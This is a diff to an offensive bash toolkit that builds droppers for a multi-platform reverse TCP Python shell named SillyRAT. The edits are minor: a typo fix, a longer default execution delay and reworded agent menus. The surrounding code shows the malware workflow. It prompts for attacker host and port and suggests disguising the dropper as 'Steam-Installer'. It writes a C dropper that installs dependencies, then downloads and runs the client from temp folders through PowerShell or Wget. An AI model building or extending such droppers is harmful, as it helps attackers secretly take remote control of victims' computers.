@@ -10276,7 +10276,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam-Installer\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
-if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
+if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -10359,13 +10359,13 @@ if [ "$SOSP" = "Windows" ]; then
 
 elif [ "$SOSP" = "Linux" ]; then
 
-      ## Set Agent (Client.py) execution delay time in seconds (default 30)
-      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 30\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
-      if [ -z "$delayTime" ]; then delayTime="30";fi
+      ## Set Agent (Client.py) execution delay time in seconds (default 40)
+      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 40\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
+      if [ -z "$delayTime" ]; then delayTime="40";fi
 
       ## BUILD DROPPER (Install python3/Download/Execute Client.py)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-      echo "${BlueF}[☠]${white} Client.py delay time of: $delayTime (sec)"${Reset};
+      echo "${BlueF}[☠]${white} Client.py delay time: $delayTime (sec)"${Reset};
       echo "#include<stdio.h>" > $Drop.c
       echo "#include<stdlib.h>" >> $Drop.c
       echo "#include<string.h>" >> $Drop.c
@@ -12297,11 +12297,11 @@ cat << !
     AGENT Nº6
     ─────────
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
-    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
+    TARGET SYSTEMS     : Multi-Platforms (Linux|Mac|Windows)
     LOLBin             : Powershell|Wget (DownloadFile)
     DROPPER EXTENSION  : VBS|NULL
     AGENT EXTENSION    : PY
-    DETECTION RATIO    : https://....
+    AGENT PERSISTENCE  : NOT AVAILABLE
 
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
@@ -13950,12 +13950,11 @@ cat << !
 
     AGENT Nº5
     ─────────
+    TARGET SYSTEMS     : Windows|Linux|OSx
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
-    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
     LOLBin             : Powershell|Wget (DownloadFile)
     DROPPER EXTENSION  : EXE|NULL
     AGENT EXTENSION    : PY
-    DETECTION RATIO    : https://....
 
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
